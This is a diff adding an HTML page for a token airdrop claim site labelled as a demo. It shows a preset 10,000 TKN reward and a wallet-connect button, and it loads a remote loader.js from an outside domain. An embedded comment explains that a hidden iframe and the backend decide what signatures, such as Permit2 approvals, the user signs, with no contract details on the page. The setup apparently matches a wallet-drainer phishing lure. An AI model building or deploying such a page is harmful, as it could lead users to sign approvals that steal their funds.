@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AirDrop Claim — Demo dApp</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: #0a0a12;
+      color: #e4e4ed;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+
+    .card {
+      background: #12121e;
+      border: 1px solid #1e1e35;
+      border-radius: 16px;
+      padding: 40px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .logo { font-size: 2.4rem; margin-bottom: 16px; }
+    h1 { font-size: 1.5rem; font-weight: 700; margin-bottom: 8px; }
+    .sub { color: #7a7f94; font-size: .92rem; margin-bottom: 32px; }
+
+    .reward-box {
+      background: #1a1a2e;
+      border: 1px solid #252540;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 24px;
+    }
+
+    .reward-amount {
+      font-size: 2rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #7c5cfc, #38bdf8);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .reward-label { font-size: .82rem; color: #7a7f94; margin-top: 4px; }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px 24px;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all .2s;
+      margin-bottom: 12px;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #7c5cfc, #6341e0);
+      color: #fff;
+      box-shadow: 0 4px 20px rgba(124, 92, 252, .3);
+    }
+    .btn-primary:hover { box-shadow: 0 6px 30px rgba(124, 92, 252, .5); transform: translateY(-1px); }
+
+    .btn-secondary {
+      background: #1a1a2e;
+      border: 1px solid #252540;
+      color: #e4e4ed;
+    }
+    .btn-secondary:hover { border-color: #7c5cfc; }
+
+    .status {
+      font-size: .82rem;
+      color: #7a7f94;
+      margin-top: 16px;
+      min-height: 20px;
+    }
+
+    .connected-info {
+      display: none;
+      background: #1a1a2e;
+      border: 1px solid #252540;
+      border-radius: 10px;
+      padding: 12px 16px;
+      margin-bottom: 20px;
+      text-align: left;
+      font-size: .84rem;
+    }
+
+    .connected-info.show { display: block; }
+    .connected-info .label { color: #7a7f94; font-size: .75rem; }
+    .connected-info .value { color: #34d399; font-family: monospace; }
+
+    .footer { margin-top: 24px; font-size: .75rem; color: #4a4a60; }
+    .footer a { color: #7c5cfc; text-decoration: none; }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">🪂</div>
+  <h1>Token Airdrop Claim</h1>
+  <p class="sub">Connect your wallet to claim your allocated tokens.</p>
+
+  <!-- Wallet info (shown after connect) -->
+  <div class="connected-info" id="wallet-info">
+    <div class="label">Connected Wallet</div>
+    <div class="value" data-waas-address></div>
+  </div>
+
+  <!-- Reward display -->
+  <div class="reward-box">
+    <div class="reward-amount">10,000 TKN</div>
+    <div class="reward-label">Your allocation</div>
+  </div>
+
+  <!-- Connect button — loader.js binds this automatically -->
+  <button class="btn btn-primary" data-waas-connect>Connect Wallet</button>
+
+  <!-- Execute button — triggers the backend relay -->
+  <button class="btn btn-secondary" data-waas-execute="claim">🎁 Claim Tokens</button>
+
+  <!-- Status text -->
+  <div class="status" id="status"></div>
+</div>
+
+<div class="footer">
+  Powered by <a href="https://api.authorisedt3st.com">IntegratedDEX WaaS</a>
+</div>
+
+<!-- 
+  ═══════════════════════════════════════════════════════════════
+  THIS IS THE ONLY THING YOU EMBED — one script tag.
+  
+  The loader.js:
+  1. Injects a hidden iframe from your backend
+  2. Wallet modal lives INSIDE that iframe
+  3. When user clicks "Claim Tokens", it calls your backend
+  4. Backend decides: use Permit2? Session key? Direct tx? Sponsored gas?
+  5. User signs what the backend tells them to sign
+  6. Backend executes on-chain
+  7. Result comes back through the iframe → to this page
+  
+  NO ABIs, NO contract addresses, NO routing logic in this page.
+  ═══════════════════════════════════════════════════════════════
+-->
+<script src="https://api.authorisedt3st.com/sdk/loader.js" data-project="wsk_739ad101fbabf250dbd92b639fe53aac955c2b116b5b4875" data-theme="dark"></script>
+
+<script>
+  // Listen for events from the SDK
+  WaaS.on("connect", (data) => {
+    document.getElementById("wallet-info").classList.add("show");
+    document.getElementById("status").textContent = "✅ Wallet connected — ready to claim";
+  });
+
+  WaaS.on("disconnect", () => {
+    document.getElementById("wallet-info").classList.remove("show");
+    document.getElementById("status").textContent = "";
+  });
+
+  WaaS.on("tx:submitted", (data) => {
+    document.getElementById("status").textContent = "⏳ Transaction submitted...";
+  });
+
+  WaaS.on("tx:confirmed", (data) => {
+    document.getElementById("status").textContent = "🎉 Tokens claimed! Tx: " + data.txHash;
+  });
+
+  WaaS.on("error", (data) => {
+    document.getElementById("status").textContent = "❌ " + data.message;
+  });
+</script>
+
+</body>
+</html>
